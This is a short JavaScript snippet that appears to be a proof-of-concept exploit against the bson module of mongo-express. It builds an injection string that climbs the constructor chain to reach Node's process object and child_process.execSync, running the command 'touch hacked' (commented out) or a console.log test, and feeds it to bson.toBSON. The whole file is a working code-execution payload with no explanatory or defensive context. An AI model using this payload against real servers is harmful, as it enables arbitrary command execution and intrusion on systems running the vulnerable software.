// exploit = "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch hacked')"
// exploit = "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch hacked')"
exploit = "this.constructor.constructor(\"return process\")().mainModule.console.log(123)"
var bson = require('mongo-express/lib/bson')
bson.toBSON(exploit)
